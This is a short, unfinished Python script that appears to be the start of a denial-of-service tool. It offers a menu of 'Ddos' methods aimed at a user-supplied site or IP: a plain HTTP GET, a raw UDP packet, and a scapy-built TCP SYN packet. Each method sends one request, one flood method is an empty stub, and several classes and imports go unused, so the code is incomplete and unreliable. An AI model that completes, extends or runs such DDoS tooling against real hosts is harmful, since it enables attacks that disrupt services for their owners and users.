import hashlib
import threading
import socket
import tkinter
import asyncio
import requests
import time
import logging
from scapy.all  import *
from tkinter import ttk
from tkinter import messagebox
from tkinter import filedialog
#class Tacks:
#    def allowed_work:
#         print
class Network: #hashlib,threading,socket,asyncio
    def Net_shifter(self):
        pass
class Base:
    def Save(self):
        pass
class Request(Base,Network): #requests,hashlib,threading,time,random
    def Ddos(self):
        self.user = input("site/Ip| input: ")
        requests.get(self.user)
    def lowlevel_ddos(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.user = input("select|Site / input:")
        s.sendto(b"Hi", (f"{self.user}", 80))
    def random_allpackages(self):
        self.all_ddos = input("Site/Ip _input_:")
        package_packet = IP(dst = f"{self.all_ddos}") /  TCP(dport = 90, flags = "S")
        send(package_packet)
    def flood_http_script(self):
        self.powerscripting = input("select | Site/Ip input:")


    def selector(self):
        logging.info("Select: 1 - Ddos/2 - lowLevel_ddos/3 - random_allpackages /4")
        self.local = input("| input:")
        if self.local == "1":
            return self.Ddos()
        elif self.local == "2":
            return self.lowlevel_ddos()
        elif self.local == "3":
            return self.random_allpackages()
        else:
            logging.error(f"Warning Error {self.local}")
if __name__ ==  "__main__":
    reader = Request()
    reader.selector()